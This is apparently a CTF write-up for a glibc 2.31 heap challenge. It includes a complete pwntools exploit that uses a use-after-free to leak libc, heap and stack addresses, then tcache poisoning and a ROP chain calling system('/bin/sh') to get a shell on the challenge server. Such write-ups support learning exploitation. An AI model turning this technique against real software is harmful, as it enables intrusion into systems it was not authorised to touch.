was a classic heap challenge with 52 solves at the end of the ctf

people are getting better day by day with heap...

![chall](https://github.com/user-attachments/assets/78d8036a-eb7b-4e9b-9099-529cf30bdbdb)


UAF vulnerability when free and the challenge is very generous with how many actions we can take

i leaked the libc and the stack to do ROP (from saved rip of malloc)

could definitely save time and just use malloc hooks... (glibc 2.31)

but i forgot about them when i was solving the challenge lol

anyway, here is the infamous do.py (with some comments)

```
#!/usr/bin/env python3

from pwn import *
context.arch = 'amd64'
'''
p = gdb.debug("./chall_patched", gdbscript="""
    c
""")
'''
p = remote("chall.ehax.tech", 1925)

libc = ELF("./libc.so.6")

def malloc(idx, size, data):
    p.sendline(b"1")
    p.sendlineafter(b"index?", idx.encode("utf-8"))
    p.sendlineafter(b"big?", size.encode("utf-8"))
    p.sendlineafter(b"payload?", data)

def free(idx):
    p.sendline(b"2")
    p.sendlineafter(b"index?", idx.encode("utf-8"))

def edit(idx, data):
    p.sendline(b"3")
    p.sendlineafter(b"index?", idx.encode("utf-8"))
    p.sendlineafter(b"contents?", data)

def view(idx):
    p.sendline(b"4")
    p.sendlineafter(b"index?", idx.encode("utf-8"))
    p.recvuntil(b">")
    return p.recvline().strip()

# leak libc via a chunk in unsortedbin
for i in range(9):                                                                                                                                                                          
    malloc(f"{i}", "128", b"CCCC")                                                                                                                                                          
                                                                                                                                                                                            
for i in range(8):
    free(f"{i}")

libc_leak = int.from_bytes(view("7"), 'little')
libc_base = libc_leak - 0x1ecbe0
env = libc_base + 0x1ef600 
print(f"libc base: {hex(libc_base)}")
print(f"environ: {hex(env)}")

# fill tcache
for i in range(9):
    malloc(f"{i}", "128", b"DDDD")

# leak heap for no reason :p
malloc("0", "20", b"AAAA")
malloc("1", "20", b"BBBB")
free("1")
free("0")

heap_leak = int.from_bytes(view("0"), 'little')

# allocate a chunk with a libc address that points to the stack
edit("0", p64(env))
malloc("1", "20", b"")
malloc("2", "20", b"")
free("1")

stack_leak = int.from_bytes(view("1"), 'little')
rip = stack_leak - 0x120
print(f"saved rip: {hex(rip)}")

# allocate a chunk on stack
malloc("3", "60", b"aaaa")
malloc("4", "60", b"bbbb")
free("4")
free("3")
edit("3", p64(rip))
malloc("3", "60", b"aaaa")

# do rop on saved rip of malloc
libc.address = libc_base 
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
binsh = next(libc.search(b"/bin/sh"))

payload = p64(ret) + p64(pop_rdi) + p64(binsh) + p64(libc.symbols['system'])
malloc("4", "60", payload)

# enjoy shell
p.interactive()
```

![flaggg](https://github.com/user-attachments/assets/279039a3-6b74-4cef-933c-96116e3bffb1)








